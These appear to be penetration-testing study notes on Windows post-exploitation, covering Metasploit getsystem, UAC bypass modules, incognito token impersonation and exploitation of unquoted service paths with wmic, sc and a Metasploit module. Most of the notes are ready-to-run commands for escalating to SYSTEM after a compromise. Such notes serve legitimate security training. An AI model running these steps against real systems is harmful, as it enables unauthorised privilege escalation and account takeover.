# ------------------------------- start post exploitation   ------------------------------- # 
    ==> Quick view: basically means the phases of operation once a victim's system has been
        compromised by the attacker. The value of the compromised system is determined by the
        value of the actual data stored in it and how an attacker may make use of it for malicious purposes.

    - meterpreter: getsystem
    - UAC bypass
    - windows tokens
    - unqouted service paths
# -------------------------------   end post exploitation ------------------------------- # 

# ------------------------------- start post exploitation techniques ------------------------------- # 
    # ---------- |Tools| ---------- #
        - metasploit: getsystem

    # ---------- |meterpreter: getsystem| ---------- #
        ==> Quick View: easiest and fastest way to get higher privileges is running command within meterpreter.
            it automatically find the best technique to elevate privielges.
        
        meterpreter> getsystem

        meterpreter> getsystem -t 1
            ==> explanation: try specific technique for privilege escalation.

    
    # ---------- |start UAC bypass| ---------- #
        # ---------- |Tools| ---------- #
            - metasploit: post/windows/gather/win_privs
            - metasploit: post/windows/local/bypassuac
                ==> V.I Note: search for bypassauc to get all modules. 

        # ---------- |metasploit: post/windows/gather/win_privs| ---------- #
            1st: verify UAC status
                meterpreter> run post/windows/gather/win_privs

        # ---------- |metasploit: post/windows/local/bypassuac_vbs| ---------- #
            2nd: bypassauc incase of status is enable.
                msf> use post/windows/local/bypassuac_vbs
                set session <session_id>
                run
            3rd: run win_privs again.
                meterpreter> run post/windows/gather/win_privs
            4th: run getsystem again.
    # ---------- |  end UAC bypass| ---------- #

    # ---------- |start windows tokens| ---------- #
        # ---------- |Tools| ---------- #
            - metasploit: incognito

        # ---------- |metasploit: incognito| ---------- #
            ==> Quick View: we can impersonate other valid user tockens on the machine and become that user.
                the best thing is to avoid know ot crack passwords to do this.
            ==> V.I Note: incognito has commands to add and new users and add it to specific group
            
            meterpreter> run incognito
            meterpreter> list_tokens -u
            meterpreter> impersonate_token <user>
                ==> example: impersonate_token els\\els         #double slash, one of them for escape.  
    # ---------- |  end windows tokens| ---------- #
   
    # ---------- |start unqouted service paths| ---------- #
        ==> Quick View: abus the way that windows searches for executables belonging to a services.
            this issue arises when a windows service has been configured with a path to service binary which
            is unqouted.
            - qouted service path example, "C:\Program Files (x86)\Canon\IJ Scan Utilities\SETEVENT.exe" 
            - unqouted service path example, C:\Program Files (x86)\Canon\IJ C:\Program Files (x86)\Canon\IJ 
                windows will search for the service executable in the following order:
                    1- C:\Prgoram.exe
                    2- C:\Program Files (x86)\Canon\IJ.exe
                    3- C:\Program Files (x86)\Canon\IJ C:\Program Files (x86)\Canon\IJ
            since the affected service runss as SYSTEM, we could have a SYSTEM shell in the case the system were to be rebooted,
            or the affected service restarted.
        ==> V.I Note: write premission on the paths is required. 

        # ---------- |Tools| ---------- #
            - wmic
            - sc
            - metasploit: exploit/windows/local/trusted_service_path
        # ---------- |wmic| ---------- #
            ==> Quick View: WMI command line tool (wmic) to query for all services and paths,
                specifically searching for unqouted paths.

            wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" |findstr /i /v """
        
        # ---------- |sc| ---------- #
            ==> Quick View: sc (service control), we can also use the sc instead of wmic,
            with qc command to show config option query a specific service.

            sc qc <service_name>
                ==> example: sc qc AdobeARMservice
                             sc qc CIJRSRegister
                ==> explanation: the command return BINARY_PATH_NAME, the value will be qouted or not according to service exe path.
        
        # ---------- |metasploit: exploit/windows/local/trusted_service_path| ---------- #
            msf> use exploit/windows/local/trusted_service_path
            set session <session_id>
            run
    # ---------- |  end unqouted service paths| ---------- #
# -------------------------------   end post exploitation techniques ------------------------------- # 